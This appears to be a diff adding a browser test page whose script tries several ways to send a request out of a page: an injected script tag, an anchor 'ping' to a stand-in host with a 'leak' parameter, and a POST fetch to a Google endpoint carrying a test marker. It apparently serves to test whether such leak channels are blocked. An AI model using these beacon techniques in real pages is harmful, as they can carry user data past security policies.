@@ -1,0 +1,18 @@
+<html>
+  <body>
+    <script>
+      // Source mapping URL attempt
+      document.write('<script src="helper"><\/script>');
+      
+      // Using <a ping>
+      var a = document.createElement('a');
+      a.href = '#';
+      a.ping = 'https://a.test/report/?leak=c661126-old';
+      document.body.appendChild(a);
+      a.click();
+
+      // Using HTTP 204 URL
+      fetch('https://www.google.com/csi?test=c661126-old', {method: 'POST'});
+    </script>
+  </body>
+</html>
